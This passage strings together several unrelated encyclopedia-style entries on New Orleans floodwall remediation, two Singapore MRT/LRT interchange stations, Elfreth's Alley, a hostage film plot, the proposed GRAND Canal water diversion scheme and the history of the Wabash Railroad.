levees, floodwalls, barriers, gates and other structures as part of the Greater New Orleans Hurricane and Storm Damage Risk Reduction System (HSDRRS), which stretches across five parishes and includes much of the original Lake Pontchartrain and Vicinity Basin, as well as the West Bank and Vicinity Basin on the West Bank of the Mississippi River. When complete, the HSDRRS will reduce the risk from a storm that has a one percent chance of occurring in any given year, or a 100-year storm.\\"U.S. Army Corps of Engineers Engineering and Construction Bulletin\\" The interim closure structures already provide a temporary 100-year-level of risk reduction, and the permanent canal closures and pumps will continue to provide that same level of risk reduction. The contract for the permanent canal closures and pumps will be awarded in 2011 and construction will be complete in the fall of 2014.  Outfall canal wall remediation  Although interim closure structures (and eventually the permanent canal closures and pumps) prevent storm surge from entering the canals and provide the 100-year-level of risk reduction, several portions of the outfall canal floodwalls are being remediated, or strengthened, to meet the more stringent post-Katrina design requirements. When remediation is complete, all canals will be able to operate under a maximum operating water level of +8.0 NAVD 88. All remediation work along the outfall canals will occur within the existing rights-of-way and was scheduled to be completed in June 2011.

It is an interchange between the North East line (NEL) and Sengkang LRT (SKLRT). Along with Buangkok station, it is one of the two MRT stations located within the Sengkang planning area. The LRT station opened on 18 January 2003 along with the other East loop stations on the SKLRT, with the NEL station opening later on 20 June. Services on the West loop began service on 29 January 2005. Upgrades to the station are being implemented to improve barrier-free accessibility to the station. Located at Sengkang Town Centre between Sengkang Square and Sengkang East Way, It is directly connected to Compass One, Compass Heights and Sengkang Bus Interchange, and is within walking distance to the Compassvale Bus Interchange. History Sengkang MRT platforms The station was built to serve the Sengkang New Town developed under a government programme to transform the Sengkang area into a fully mature housing estate. Contract 702 for the construction of Sengkang and Buangkok stations and connecting tunnels (including connecting tunnels to Sengkang Depot) was awarded to Sato Kogyo- Hock Lian Seng Engineering Joint Venture at S$166.4 million (US$ million) on 26 April 1997. The elevated LRT station opened on 18 January 2003 when the East loop of the Sengkang LRT (SKLRT) started operations. The underground North East line platforms opened on 20 June that year. The station began to serve the West loop of the SKLRT when certain stations on the loop opened on 29 January 2005. As part of efforts to improve the overall accessibility of public transport, the overhead pedestrian bridge near Sengkang and other stations have lifts installed to improve barrier-free accessibility to major transport nodes. The lifts were installed progressively in 2013. Sengkang station was also the first batch of ten stations to have additional bicycle parking facilities under the National Cycling Plan announced in 2010. In 2018, it was announced that the station will be further upgraded, improving barrier- free access to the station, adding new dual-speed escalators leading to the platforms, and new lifts to connect the platforms, concourse and mezzanine levels of the station. The current LRT platform is to be expanded to create a more spacious area for commuters by 2022. =Incidents= On 27 February 2020, a power fault along the NEL resulted in service disruptions to the Punggol, Sengkang and Buangkok stations. At 5:36am, a shuttle train service was provided which operated on a single platform between the Punggol and Buangkok stations. In order to facilitate maintenance works, the power source to the tracks between the Hougang and Punggol stations was switched off. Additionally, shuttle bus services to serve the affected stations have been provided. The fault was resolved by 11:49am and usual service along the entire NEL resumed at 12:14pm. Investigations later revealed that a broken contact wire affected the power source to trains launching from Sengkang Depot, causing the service disruptions. Station details =Location and name= The station is in Sengkang New Town along Sengkang Square. The station serves the developments of Compass Heights, Compass One and the Sengkang Bus Interchange, and is within walking distance of the Compassvale Bus Interchange, the Kopitiam Square and the Sengkang Community Hub. The station name, Sengkang, means \\"prosperous harbour\\" in Mandarin. =Services= A West Loop-bound LRT train stopping at Sengkang. The station serves both the Sengkang LRT line (SKLRT) and the North East line (NEL). The station code is NE16/STC as reflected on official maps. On the SKLRT, the station is the terminus for both East loop and West loop services in both directions. The adjacent stations on the LRT line are Compassvale and Ranggung stations on the East loop and Cheng Lim and Renjong stations on the West loop. Train frequencies range from 3 to 5 minutes depending on the time of the day. The LRT station operates between 5:30am and 12:30am daily. On the NEL, the station is between the Buangkok and Punggol stations. Train frequencies on the line range from 2.5 to 5 minutes depending on the time of the day. The NEL station operates between 5:45am and 12:30am daily, with the first train bound for HarbourFront departing at around 5:45am and the last train bound for Punggol station departing at 12:28am. =Design= The station has four levels (two platform levels, mezzanine and concourse ground level). It is an integrated hub with the three modes of transport ‚Äî MRT, LRT and bus ‚Äî serving the Sengkang area. The MRT/LRT station was the first intermodal station on the MRT network for all three modes of transport. The simple layout, the atrium-like open layout and glass enclosure in the station design allow visual connections through levels and spaces, making navigation in and out of the station easier. Besides integrating with transport facilities, the station is fully integrated with the property developments of Compass Heights and Compass Point by CentrePoint Properties (now Frasers Property). =Public artwork= T.R.A.N.S.I.T.I.O.N.S. by Koh Bee Liang at the mezzanine level of the station. As part of the MRT system's Art-in-Transit Programme, T.R.A.N.S.I.T.I.O.N.S. by Koh Bee Liang is an artwork consisting of two contrasting stained-glass murals, located above ground at the opposite ends of the station mezzanine level. The station is filled with colourful rays as light is filtered through the stained glass windows. The glass murals mark Sengkang‚Äôs transition from a rural kampung (depicted in \\"warm nostalgic images of the past\\") to high-raised buildings (in black and white) that are now part of the landscape. As time goes by, the work also changes throughout the day with the transition of the sun. The black and white mural of New Sengkang, according to the artist, reflects how \\"we built up to reach the heavens\\", without pausing to reflect on the purpose. This is a reference to Singapore's urban renewal, which involves parting of the old and the memories associated with it. The distortions of the new HDB (Housing Development Board) skyscrapers also relate to the fragility of life as a result of the September 11 attacks. In contrast, the Old Sengkang mural, made of opalescent glass, depicts various characters of Singapore's past. The artist, when creating the mural to reflect the past, had conducted various interviews of old residents and used research at the Singapore National Archives for the artwork, in addition to using her experience growing up in a Kampung similar to old Sengkang.

There are 32 houses on the street, which were built between 1703 and 1836. The Elfreth's Alley Museum is located at #124 and 126.Historical marker on Elfreth's AlleyElfreth's Alley Association website. Other United States localities with three-century-old continuously inhabited homes include Santa Fe, New Mexico; various pueblos; and St. Augustine, Florida. The alley is a National Historic Landmark. Located in the Old City neighborhood, Elfreth's Alley is between North 2nd Street and North Front Street, in the block between Arch and Quarry Streets. History The Elfreth's Alley Museum (2012) Elfreth's Alley is named after Jeremiah Elfreth, an 18th-century blacksmith and property owner. Among the alley's residents were tradesmen and their families, including shipwrights, silver and pewter smiths, glassblowers, and furniture builders. In the 1770s, one-third of the households were headed by women. The Georgian and Federal-style houses and cobblestone pavement of the alley were common in Philadelphia during this time. In the late 19th and early 20th centuries, industry began to change the street. Perhaps the first change was a stove factory that took its place in a row of residential houses in 1868. Eventually, factories surrounded Elfreth's Alley. The city's waterfront was only a few blocks away. Industry changed more than the architecture; successive waves of immigrants, lured by the nearby jobs, moved onto the street. In 1900, the neighborhood was overwhelmingly Irish. In 1934, the Elfreth's Alley Association (EAA) was founded to preserve the alley's historic structures while interpreting the street's history. The EAA helped save the street from demolition, and also lobbied the city to restore the alley's name to \\"Elfreth's Alley\\"; it had been designated as the 100 block of Cherry Street years before as part of a street-name simplification program. Elfreth's Alley is today the product of cycles of urban renewal and decay, and historic preservation efforts. The alley is a tourist attraction and a rare surviving example of 18th-century working-class housing stock. The site stands in sharp contrast to the more frequently preserved grand mansion houses of Philadelphia's Society Hill neighborhood. Remarkably, given the alley's importance to the history of colonial architecture in America, it is very difficult to find precise information about dating. However there is now a website funded by the National Endowment for the Humanities which provides exact dating for the buildings with new color illustrations of each house, both the colonial-era structures and the independence-era structures. Elfreth's Alley Museum Elfreth's Alley Museum, located in 124‚Äì126 Elfreth's Alley, preserves the 18th-century home of a pair of dressmakers. Restored to its appearance in the Colonial era, exhibits in the house and tour guides interpret the life of the house and alley's residents in that era. Guides also discuss other houses on the alley and their inhabitants. Holiday celebrations The north side of the alley nearest N. 2nd Street (2012) The Elfreth's Alley Association holds several holiday celebrations each year, whose proceeds support the upkeep and restoration of older homes. For more than 70 years, Elfreth's Alley has celebrated \\"F√™te Day\\" in early June, which celebrates the Alley's diverse ethnic heritage. Residents open their private homes to the public, and are accompanied by historical reenactments and festivities. The Brandywine Heights High School Band and their Fife and Drum Corps perform 18th-century fife tunes as they parade through the alley.\\"Feteing Fifes.\\" Concerned Parents of Brandywine Heights. 7 June 2006. In about 2000 Elfreth's Alley started holding \\"Deck the Alley\\" early every December, a self-guided tour of 13 private homes festooned with Christmas and holiday decorations, and also includes caroling.

The plot revolves around an all-male boarding school overtaken by terrorists. While the authorities remain helpless, a group of rebellious and mischievous students decide to put their resourcefulness to good use.New York Times Plot In Barranquilla, Colombia, terrorist Luis Cali has taken over the Palace of Justice with a ruthless team of mercenaries. He demands the release of his drug kingpin father, Enrique Cali, only to be told that his father has already been delivered to the United States for trial. They escape by helicopter, and with the weapons and logistics assistance of Luis's second- in-command, an American named Jack Thorpe, they enter the U.S. through Mexico. In the United States, the Regis High School is a prep school for teenage boys with wealthy and influential parents, half of whom have been expelled from other schools. A group of pranksters led by Billy Tepper that includes Billy‚Äôs best friend Joey Trotta, Hank Giles, Ricardo Montoya, Jonathan Bradberry, and Phil Donoghue is carefully watched over by their teachers and the stern but well-meaning Dean Parker. Phil's father is the Federal Judge presiding over Enrique Cali's trial, so the entire family is taken to a safe location as a precaution. Unaware of this, Luis Cali invades the school to capture Donoghue, killing the Campus Police and a faculty member who interferes. Furthermore, they rig the campus with heavy firearms and remote-detonated explosives. With Phil nowhere to be found and the sons of numerous influential individuals in his grasp, Luis takes the entire school hostage. Underestimating the threat, the local Sheriff attempts to intervene but is repelled by fire from a .50 caliber M2 machine gun. The State Police, FBI and US Army are called in, keeping their distance to avoid provoking the terrorists. Luis releases the school faculty except for the cooks and the headmaster, Robert Gould, but institutes hourly headcounts to keep track of the boys. The students, under Billy's leadership, use their expertise in skirting authority to collect tactical information about the occupying forces, which Billy covertly brings to the authorities on the outside. They won't allow Billy to return, but with Parker's encouragement, he escapes and narrowly rejoins the students in time to be counted, preventing the killing of Gould and four students in response. Joey's father, New York City mob boss Albert Trotta, arranges through Luis' father for the boy to be released. Joey, contemptuous of his father, refuses to go. He steals a submachine gun and opens fire on another terrorist, but he is killed in the exchange. Luis tries to impress upon Parker, who comes to retrieve the body, that it was an accident, but Albert takes revenge by having Enrique Cali killed in prison. Knowing they must act before Luis can learn of his father's death, the authorities undertake a rescue mission. FBI Hostage Rescue Team personnel (trailed by Parker), supported by the Army, covertly infiltrate the school and begin taking out terrorists. Meanwhile, Billy and his friends sabotage the detonator for the explosives, incapacitate several more terrorists with surprise attacks, and lead the students and Gould to a secret basement chamber. Overwhelmed by the assault, in which most of the terrorists are killed, Luis takes Billy at gunpoint and holds him in Gould's office. Parker and the commandos converge and kill Luis, with Parker being wounded in the process. The few remaining terrorists are subdued and the students are freed.

Note that 20% of the runoff flows into Hudson-James Bay where less than 1% of the population live. Possible scenario of the GRAND Canal scheme, showing the initial water capture and diversion into Lake Huron. Water would be pumped south from the newly formed James Lake into the Harricana River, crossing into the Great Lakes watershed near Amos, into Lake Timiskaming and the Ottawa River, crossing near Mattawa into Lake Nipissing and the French River to Lake Huron. The Great Recycling and Northern Development (GRAND) Canal of North America or GCNA is a water management proposal designed by Newfoundland engineer and visionary Thomas Kierans to alleviate North American freshwater shortage problems. It proposed damming James Bay, using the techniques of the Zuiderzee/IJsselmeer, to prevent its waters mixing with the salt water of Hudson Bay to the north. This would produce an enormous freshwater lake, some of which would be pumped south into Georgian Bay where it would increase the freshwater levels of the lower Great Lakes. The flow would be the equivalent to 2.5 Niagara Falls. The plan was promoted by Kierans from 1959 until his death in 2013 and since by his son, Michael Kierans. This plan arose as water quality issues threatened the Great Lakes and other vital areas in Canada and the United States.Great Lakes water diversion CityMayors.com Kierans proposed that to avoid a water crisis from future droughts in Canada and the United States, in addition to water conservation, acceptable new fresh water sources had to be found. During the 1960s and again in the 1980s when Great Lake water levels declined dramatically, there was interest in the GRAND Canal. However, the reluctance of the US and Canadian governments to enter into large scale co-operative international water sharing arrangements and claims of potential negative environmental impact of the proposal have prevented serious consideration of the idea.  Background  In 1959, Canada officially claimed that U.S. expansion of a Chicago diversion from Lake Michigan would harm downstream Canadian areas in the Great Lakes Basin. The Canadian government further stated that exhaustive studies had indicated no additional sources of freshwater were available in Canada to replace the waters that would be removed from the Great Lakes by the proposed diversion. Kierans disputed the accuracy of the 1959 Canadian government's position and asserted that the GRAND Canal could provide additional fresh water to the Great Lakes. Waters from the Ogoki River and Longlac are now being diverted into the Great Lakes at a rate equivalent to that taken by the U.S. at the Chicago diversion.DeCew Falls II Ontario Power Generation  Proposal  In his GCNA proposal, Kierans asserts that experience in the Netherlands demonstrates that a large new freshwater source can be created in Canada's James Bay by collecting runoff from many adjacent river basins in a sea level, outflow-only dyke- enclosure. The project would capture and make available for recycling the entire outflows of the La Grande, Eastmain, Rupert, Broadback, Nottaway, Harricana, Moose, Albany, Kapiskau, Attawapiskat and Ekwan rivers.A brief history of the Great Recycling and Northern Development (Grand) Canal project Undercurrents Moreover, Kierans claims that the California Aqueduct proves that runoff to James Bay can be beneficially recycled long distances and over high elevations via the GRAND Canal. The GCNA would stabilize water levels in the Great Lakes and St. Lawrence River and improve water quality. The GRAND Canal system would also deliver new fresh water from the James Bay dyke- enclosure, via the Great Lakes, to many water deficit areas in Canada and the United States. The project was estimated in 1994 to cost C$100 billion to build and a further C$1 billion annually to operate, involving a string of nuclear reactors and hydroelectric dams to pump water uphill and into other water basins. Benefits and costs Kierans argues recycling runoff from a dike-enclosure in Canada's James Bay is not harmful and can bring both nations many useful benefits including: # More fresh water for Canada and the United States to stabilize Great Lakes/St. Lawrence water levels and to relieve water shortages and droughts in western Canada and in the south-west U.S. and in particular to halt the depletion and start the replenishment of the Ogallala Aquifer (see Water export); # Improved fisheries and shipping in Hudson Bay. Oceanographer Professor Max Dunbar pointed out in his paper \\"Hudson Bay has too much fresh water\\"Dunbar, Max (1993, May) Centre for Climate and Global Change Research, McGill University that as a result of its low salinity Hudson Bay currently \\"offers no possibilities for commercial fisheries\\". By recycling the fresh water runoff from James Bay south to the Great Lakes and away from Hudson's Bay the GRAND Canal will increase Hudson Bay's now harmfully low salinity and consequently improve the commercial fisheries. Increasing the salinity of Hudson Bay will also have the benefit of reducing the freeze-over period during the winter and thereby lengthen the navigation season in Hudson Bay; # Improved Great Lakes water quality due to the increased flows; # Increased electricity available for alternate uses and lowered user cost of electricity by integrating water transfer energy needs with peak power demand; # Enhanced flood controls;The GRAND Canal Official Web Site: Proposal # Improved forest fire protection for both nations;The GRAND Canal Official Website: Summary # The construction and operation of the GCNA would provide economic stimulus to create employment and avoid recession. This would be similar to the economic stimulus that the Tennessee Valley Authority development and other public works had in the 1930s to start the recovery from the Great Depression. According to Kierans, project organization to recycle runoff from James Bay Basin could be like that for the St. Lawrence Seaway. Capital costs for about 160 million users will exceed $100 billion. But, he claims, \\"before construction is completed, the total value of social, ecologic and economic benefits in Canada and the U.S. will surpass the project's costs.\\"  Developments  The GRAND Canal proposal attracted the attention of former Qu√©bec premier Robert Bourassa and former prime minister of Canada Brian Mulroney. By 1985, Bourassa and several major engineering companies endorsed detailed GRAND Canal concept studies;Bourassa, Robert (1985, May). Power From the North, Prentice Hall of Canada Ltd. however, these concept studies have not proceeded in part because of opposition based on the potential environmental impact of the plan.  Environmental concerns  The GRAND Canal scheme could alter the breeding grounds of the critically endangered Eskimo curlew. Some potential environmental impacts of this proposal that would require study prior to its implementation include: # Later ice formation, and earlier ice breakup outside the dike corresponding to an opposite change in the fresh waters inside; # Diminished ecological productivity, possibly as far away as the Labrador Sea; # Fewer nutrients being deposited into Hudson Bay during spring melts; # Removal of James Bay's dampening effect on tidal and wind disturbances; and # Adversely affected migratory bird populations.Milko, Robert (1986, December). Potential ecological effects of the proposed GRAND Canal diversion project on Hudson and James Bays. Arctic, 39(4): 316-325. The reduced freshwater flow into Hudson Bay will alter the salinity and stratification of the bay, possibly impacting primary production in Hudson Bay, along the Labrador coast, and as far away as the fishing grounds in the Grand Banks of Newfoundland, the Scotian Shelf, and Georges Bank. If the James Bay dike is built, \\"Virtually all marine organisms would be destroyed [in the newly formed lake]\\".Milko, Robert (1986, December). Potential ecological effects of the proposed GRAND Canal diversion project on Hudson and James Bays. Arctic, 39(4): 322. Freshwater species would move in, but northern reservoirs tend to fail to produce viable fisheries. The inter- basin connections would be ideal vectors for invasive species to invade new waters. The construction of a dike across James Bay could negatively impact many mammal species, including ringed and bearded seals, walruses, and bowhead whales, as well as vulnerable populations of polar bears and beluga whales. The impacts would also affect many species of migratory bird, including lesser snow geese, Canada geese, black scoters, brants, American black ducks, northern pintails, mallards, American wigeons, green-winged teals, greater scaups, common eiders, red knots, dunlins, black-bellied, American goldens, and semipalmated plovers, greater and lesser yellowlegs, sanderlings, many species of sandpipers, whimbrels, and marbled godwits, as well as the critically endangered Eskimo curlew.  Social concerns  The project is expected to cost C$100 billion to implement, and a further C$1 billion a year to operate. Most of the water diverted would be exported to the U.S. In addition, the shoreline communities of Attawapiskat, Kashechewan, Fort Albany, Moosonee and Moose Factory in Ontario, and Waskaganish, Eastmain, Wemindji and Chisasibi in Quebec would be forced to relocate. = Conspiracy theory = In the 1990s, Canadian conspiracy theorists believed the \\"GRAND Canal\\" was part of a conspiracy to end Canadian sovereignty and force it into a union with the U.S. and Mexico.The planned destruction of Canada from the Social Credit Party of Canada newspaper the Michael Journal Conspiracy theorists believed that forces interested in a North American Union would agitate for Quebec separation, which would then touch off a Canadian civil war and plunge the Canadian economy into a depression.

It is an interchange between the North South line and Bukit Panjang LRT, serving as the western terminus of the latter. The station is located between Choa Chu Kang Bus Interchange and Lot One in the Choa Chu Kang town centre. Currently, the station's LRT platform is the only station on the Bukit Panjang LRT to use a Spanish solution, and is the second rail station in Singapore to use such a configuration after VivoCity station on the Sentosa Express. It is also one of the three interchange stations on the Singapore MRT/LRT system to be fully elevated; the other two being Jurong East MRT station and Tanah Merah MRT station. Choa Chu Kang station is proposed to become an interchange with the Jurong Region line, which is slated for completion in 2026. It will be the northern terminus of the Main Branch of the Jurong Region line. History Exit A of Choa Chu Kang station Choa Chu Kang MRT island platform. Choa Chu Kang LRT island platform. A side platform, meant for alighting commuters, can be seen on the right. Concourse of the LRT The contract for the construction of the Bukit Panjang station was awarded to a Taiwanese-Singapore joint venture (RSEA International-Hock Lian Seng) at a contract sum of S$99.8 million in January 1986. The contract also includes the construction of the Jurong, Bukit Batok and Bukit Gombak stations and the viaducts. Construction began on 15 February 1986. The MRT station was opened on 10 March 1990 and was the terminus of the Branch line. With the opening of the North South line Woodlands Extension on 10 February 1996, the branch line was incorporated into the North South line. The LRT station opened on 6 November 1999, alongside the rest of the Bukit Panjang LRT line. The station was third one to have an Xchange after those in the underground Dhoby Ghaut and Raffles Place, making the station the first to have an Xchange above-ground and in a residential neighbourhood. Since 26 August 2011, automatic platform gates were installed on the North South line platforms and commenced operation on 21 October that year. HVLS fans in the MRT platform commenced operations on 10 October 2012. The LRT platform also features fans as of 27 September 2015. =New LRT Platforms= On 31 October 2012, LTA announced that Choa Chu Kang LRT station will have two more platforms, specifically for commuters to exit the trains to allow the existing platform in the centre to have more space to cater to boarding passengers. There will also be additional fare gates and a new covered linkway from the LRT station to Lot One. These new additions which also include widening the staircase between the MRT and the LRT stations will be completed by 2016. New Exit E was opened at the same time, to Lot One Shoppers Mall but despite that, there is no lift access, only stairs. The two newly constructed platforms at the LRT station began operations on 27 December that year. The two new side platforms, platforms 3 and 4, lack lift access so passengers who needs to take the lift when alighting at Choa Chu Kang LRT station have to wait for the doors to open to the island platform (platforms 1 and 2), where lift access is available. Stickers to remind passengers to exit at platforms 1 or 2 if they need a lift to exit are placed on all the LRT doors. In 2016, platforms 1 and 2 of the LRT had half-height platform barriers installed. Choa Chu Kang (and Bukit Panjang) was the first to install half-height platform barriers due to the high commuter traffic at this station. Half-height platform barriers were installed at platforms 3 and 4 during construction. =Jurong Region line Interchange= On 9 May 2018, LTA announced that Choa Chu Kang station would become a terminus for the Jurong Region line (JRL). The station will be constructed as part of Phase 1, JRL (West), consisting of 10 stations between Choa Chu Kang, Boon Lay and Tawas, and is expected to be completed in 2026. The platforms will be situated on the former site of the Choa Chu Kang Bus Interchange as well as HDB multi-storey carpark at Block 303 Choa Chu Kang Avenue 4, located to the west of the current station complex. While the JRL platform will be of a typical Island platform design, an additional platform will be constructed to allow cross platform transfer between the Jurong Region line services and North South line southbound services. The Contract J102 for the design and construction of Choa Chu Kang JRL station and associated viaducts, including Addition & Alteration works to the existing station complex, was awarded to Shanghai Tunnel Engineering Co. (Singapore) Pte Ltd at a sum of S$465.2 million. Construction will start in 2020, with completion in 2026. The Contract J102 also includes the design and construction of Choa Chu Kang West station and Tengah station, and associated viaducts. Incidents On 7 April 2008, a man was hit by a train at Choa Chu Kang station at 8am. this resulted in the disruption of northbound train services from Yew Tee to Bukit Gombak for about 50 minutes. He was subsequently pronounced dead by paramedics. A bus-bridging service was deployed between Yew Tee and Bukit Gombak stations as trains were made to turn around at Yew Tee, Bukit Gombak and Choa Chu Kang stations. As a precaution, automatic platform gates were subsequently installed on the North South line platforms.

It served a large area, including track in the states of Ohio, Indiana, Illinois, Iowa, Michigan, and Missouri and the province of Ontario. Its primary connections included Chicago, Illinois; Kansas City, Missouri; Detroit, Michigan; Buffalo, New York; St. Louis, Missouri; and Toledo, Ohio. The Wabash's major freight traffic advantage was the direct line from Kansas City to Detroit, without going through St. Louis or Chicago. Despite being merged into the Norfolk and Western Railway (N&W;) in 1964, the Wabash company continued to exist on paper until the N&W; merged into the Norfolk Southern Railway (NS) in 1982. At the end of 1960 Wabash operated 2,423 miles of road on 4,311 miles of track, not including Ann Arbor and NJI&I; that year it reported 6,407 million net ton-miles of revenue freight and 164 million passenger-miles. Origin of name 1886 system map The source of the Wabash name was the Wabash River, a -long river in the eastern United States that flows southwest from northwest Ohio near Fort Recovery, Ohio across northern Indiana to Illinois where it forms the southern portion of the Illinois- Indiana border before draining into the Ohio River, of which it is the largest northern tributary. The name \\"Wabash\\" is an anglicization of the French name for the river, \\"Ouabache.\\" French traders named the river after the native Miami tribe's word for the river.

The first railroad to use only Wabash and no other city in its name was the Wabash Railway in January 1877 which was a rename of the Toledo, Wabash and Western Railway formed on July 1, 1865. The earliest predecessor of the Wabash System was the Northern Cross Railroad, which was the first railroad built in Illinois. Text also at http://www.catskillarchive.com/rrextra/abonw.Html The Toledo and Illinois Railroad was chartered April 20, 1853 in Ohio to build from Toledo on Lake Erie west to the Indiana state line. The Lake Erie, Wabash and St. Louis Railroad was chartered in Indiana on August 19 to continue the line west through Wabash into Illinois towards St. Louis, Missouri, and the two companies merged August 4, 1856 to form the Toledo, Wabash and Western Railroad with a total length of 243 miles.Preliminary report on the Eighth Census 1860 by United States Census Bureau (Washington DC: 1862), page 226 =Post-Civil War= It was this group of railroads that formed the beginning of the Wabash System with the rename in 1877. Later mergers and reorganizations formed the Wabash, St. Louis and Pacific Railway on November 7, 1879, and Wabash Railroad on August 1, 1889. Financier John Whitfield Bunn was one of several capitalists who were instrumental in the consolidation of the Wabash System. =Early 20th century= 1887 system map In 1904, the Wabash Pittsburgh Terminal Railway was formed and acquired control of the Wheeling and Lake Erie Railroad, giving the Wabash access to Pittsburgh, Pennsylvania as the final step in an attempt to break the near-monopoly of the Pennsylvania Railroad (PRR) and New York Central Railroad for traffic to the east. However, the Wabash had overextended itself, and the WPT went bankrupt in 1908; it would later become part of the Pittsburgh and West Virginia Railway. The Wabash Railroad itself was sold at foreclosure July 21, 1915 and reorganized October 22 as the Wabash Railway. This wooden box car, owned by the Wabash Railroad, was built in the 1920s and assigned to the Studebaker plant in South Bend, Indiana. The Pennsylvania Railroad acquired loose control of the Wabash in 1927 by buying stock through its Pennsylvania Company. In 1929 the Interstate Commerce Commission charged the PRR with violating the Clayton Antitrust Act. The ruling was appealed, and in 1933 the Circuit Court ruled that the control was for investment only and did not violate the act. The Wabash Railway again entered receivership on December 1, 1931. The Wabash Railroad, controlled by the PRR, was organized in July 1941 and bought the Wabash Railway on December 1. =Late 20th century= The Wabash Cannonball at the Danville, IL station on October 28, 1962 In fall of 1960, the PRR agreed to a lease of the Wabash by the Norfolk and Western Railway. The PRR's Detroit, Toledo and Ironton Railroad assumed control of the Wabash's Ann Arbor on December 31, 1962. On October 16, 1964 the New York, Chicago and St. Louis Railroad (Nickel Plate Road) merged into the Norfolk and Western Railway, and the N&W; leased the Wabash and Pittsburgh and West Virginia Railway. On March 31, 1970 the Pennsylvania Company exchanged its last Wabash shares for N&W; common stock; that stock was later divested as a condition of the 1968 merger into Penn Central Transportation. Because it was only leased, as opposed to merged outright, the Wabash Railroad continued to trade its stock on the New York Stock Exchange. The N&W; and the Southern Railway merged in 1982, although the Wabash continued to exist on paper. NS formally merged the Wabash into the N&W; in November 1991. Major routes Windsor ON- Buffalo NY/Niagara Falls NY In 1897 the Wabash leases the eastern lines of the former Great Western Railway between Windsor and Buffalo, which was amalgamated with the Grand Trunk in 1882. Charles M. Hays, president of the Grand Trunk and former president of the Wabash, secures a trackage rights agreement to give the Wabash operating rights in Canada. Its Canadian headquarters are located in St. Thomas because it is roughly equidistant between Detroit and Niagara Falls. https://stthomaspubliclibrary.ca/wp-content/uploads/2018/04/Wabash.pdf =Toledo‚ÄìHannibal= The Toledo to Hannibal Line was constructed in 1855. The line out of the Illinois River valley from Griggsville to Baylis had the steepest ruling grade on the Wabash, almost 2%, which required helpers in steam era. After World War II, the line was relocated to ease the grade. In 1955, passenger service was discontinued, and by 1989, the line from Maumee to Liberty Center, Ohio was abandoned. The portion from Liberty Center to the western border of Ohio is operated by a shortline railroad. The abandoned section was converted for use as the south fork of the Wabash Cannonball Trail. The Maumee-Montpelier, Ohio section was abandoned by NS in 1990, and makes up the North fork of the Wabash Cannonball Trail. It is the longest rail trail in Ohio. After the breakup of Conrail in 1998, NS connected the small remaining segment from Maumee to its Chicago Main, allowing it to access Maumee via a shorter route. This caused the abandonment of the west side of the Toledo Terminal Railroad. =Detroit‚ÄìChicago= This line covers the 3rd (Montpelier-Detroit) and 4th (Montpelier-Clarke Jct.‚ÄìB&OCT;+SC&S;‚ÄìState Line‚ÄìC&WI;) Districts of the Wabash. The Wabash was part of the Union Belt of Detroit, a joint switching operation started with the Pere Marquette and later the PRR joined. Detroit-Saint Louis passenger trains: *Detroit Limited (Pullman) *St. Louis Limited (Pullman) (westbound counterpart to the Detroit Limited) *Cannon Ball Detroit-Chicago passenger Trains: *Detroit Arrow (joint with PRR) *Chicago Arrow (joint with PRR) (westbound counterpart to the Detroit Arrow) The Montpelier-Chicago line was started in the early 1890s, allowing the Wabash to give up trackage rights over the Erie (Chicago and Atlantic). =Chicago‚ÄìSt. Louis= The Blue Bird's \\"Vista-Dome\\" dome parlor- observation car in the 1950s. Completed in 1880 from Bement to Chicago, using the Chicago & Western Indiana as a terminal line. The Wabash became a joint owner of the C&WI; along with founder Chicago & Eastern Illinois and other railroads. It comprises the 6th, 7th and 8th Districts of the Decatur Division. Trackage between Manhattan and Gibson City was abandoned by NS, for rights on CN (IC). Passenger trains: * Blue Bird * Banner Blue * Wabash Banner Limited =Council Bluffs, Iowa ‚Äì Brunswick, Missouri= This line has the highest point on the Wabash at Dumfries, Iowa (1242' above sea level). Most of the line was abandoned by N&W; in 1984.ICC Decision AB-10 (SUB NO. 27) The Wabash trackage between Brunswick & Council Bluffs comprised the 18th and 19th Districts, with the dividing point being Stanberry, Missouri. =Iowa= The Iowa Southern Railroad (ISR) took over 61.5 miles of the Wabash in Iowa to the Missouri state line between Council Bluffs and Blanchard, Iowa. On August 22, 1988 the line was cut back to serve only Council Bluffs. In August 1990 the remaining Iowa Southern line in Council Bluffs was sold to the Council Bluffs & Ottumwa Railroad. In May 1991 the CBOA was sold to the Council Bluffs Railway, an OmniTrax subsidiary. Iowa Interstate purchased CBR on July 1, 2006. The 66-mile route is abandoned between Council Bluffs and Blanchard and was converted for use as the Wabash Trace Trail. =Missouri= A 93-mile portion of the Council Bluffs‚ÄìSt. Louis line in Missouri between Blanchard, Iowa and Lock Springs was sold to the Northern Missouri Railroad and began operations on February 13, 1984. Operations on that line were discontinued in June 1986. The Wabash Railroad ran their passenger trains that came into St. Louis on a 7-mile stretch of track that ran from Grand Ave (through a rail yard near Vandeventer Avenue), through University City (at Delmar Station) to a junction at Redmond Ave. in Ferguson, where the Ferguson station (now an ice cream parlor) was at North Florissant and Carson Ave., and where it met up with the current Norfolk Southern mainline. After passenger service was discontinued, trains on this stretch were reduced to one westbound symbol freight and one local per day. Norfolk Southern, who took over the line after the merger, abandoned the stretch in 1988. The Bi-State Development Agency purchased the line, which is now operated by MetroLink. MetroLink light rail trains run on the portion from north of the University of Missouri - St. Louis (UMSL) to Grand Ave, while the north portion is now the Ted Jones Trail, which runs from Florissant Road at UMSL up to Redmond Ave., where the old junction was located. Norfolk & Western abandoned the track between Lock Springs and Chillicothe in 1983, and salvaged this portion of the line in 1985. Thirty- seven miles of track between Chillicothe and Brunswick was sold to the Green Hills Rural Development, Inc., a Missouri economic development group organized as a non-profit corporation, in 1985. The line was leased, by order of the ICC, to the Chillicothe-Brunswick Rail Maintenance Authority (CBRM) on July 24, 1987. On April 1, 1990 the line was leased to the Wabash and Grand River Railway (WGR). The WGR's lease was terminated on December 1, 1993 due to severe flood damage on the line, and the line reverted to CBRM. In 2003, during a dispute caused by inter-community rivalries and jealousies over industrial development along the line, the owner, Green Hills Rural Development, Inc. \\"sold\\" the railroad to the City of Chillicothe, MO, (all real estate, rails, tools, rolling stock and locomotives) for $32,500. Thereafter, the line was immediately appraised for $1.53 million, not including rolling stock or other tools or equipment and inventory of the short line railroad. On December 8, 2006, the Chillicothe Constitution-Tribune reported that the city of Chillicothe sold the majority, about , of the railroad to Seattle-based Montoff Transportation, LLC for $976,000. The part of the railroad that was sold had been embargoed since 2004. The city still owns the railroad to the city's industrial park and to a location just east of Chillicothe, where future development is planned. Today, the part of the railroad south of Norville has been abandoned and dismantled, and the city has pocketed a large sum of cash. On January 29, 2008, The Chillicothe City Press reported that the city council had voted to buy back the right of way previously sold to Montoff Transportation, paying $10 to acquire the 100' wide by 29-mile long 